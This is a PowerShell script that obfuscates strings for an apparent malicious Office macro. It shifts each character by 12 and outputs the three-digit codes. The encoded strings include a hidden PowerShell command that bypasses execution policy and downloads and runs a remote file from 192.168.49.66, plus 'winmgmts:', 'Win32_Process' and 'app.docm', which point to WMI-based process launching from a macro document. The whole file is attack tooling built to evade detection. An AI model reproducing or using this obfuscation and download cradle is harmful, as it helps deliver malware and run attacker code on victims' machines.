$payload = "powershell -exec bypass -nop -w hidden -c iex(new-object net.webclient).downloadstring('http://192.168.49.66/attach.txt')"
[string]$output = ""
$payload.ToCharArray() | %{
 [string]$thischar = [byte][char]$_ + 12
 if($thischar.Length -eq 1)
 {
 $thischar = [string]"00" + $thischar
 $output += $thischar
 }
 elseif($thischar.Length -eq 2)
 {
 $thischar = [string]"0" + $thischar
 $output += $thischar
 }
 elseif($thischar.Length -eq 3)
 {
 $output += $thischar
 }
}
$output
write-output ""
$payload = "winmgmts:"
[string]$output = ""
$payload.ToCharArray() | %{
 [string]$thischar = [byte][char]$_ + 12
 if($thischar.Length -eq 1)
 {
 $thischar = [string]"00" + $thischar
 $output += $thischar
 }
 elseif($thischar.Length -eq 2)
 {
 $thischar = [string]"0" + $thischar
 $output += $thischar
 }
 elseif($thischar.Length -eq 3)
 {
 $output += $thischar
 }
}
$output
write-output ""
$payload = "Win32_Process"
[string]$output = ""
$payload.ToCharArray() | %{
 [string]$thischar = [byte][char]$_ + 12
 if($thischar.Length -eq 1)
 {
 $thischar = [string]"00" + $thischar
 $output += $thischar
 }
 elseif($thischar.Length -eq 2)
 {
 $thischar = [string]"0" + $thischar
 $output += $thischar
 }
 elseif($thischar.Length -eq 3)
 {
 $output += $thischar
 }
}
$output
write-output ""
$payload = "app.docm"
[string]$output = ""
$payload.ToCharArray() | %{
 [string]$thischar = [byte][char]$_ + 12
 if($thischar.Length -eq 1)
 {
 $thischar = [string]"00" + $thischar
 $output += $thischar
 }
 elseif($thischar.Length -eq 2)
 {
 $thischar = [string]"0" + $thischar
 $output += $thischar
 }
 elseif($thischar.Length -eq 3)
 {
 $output += $thischar
 }
}
$output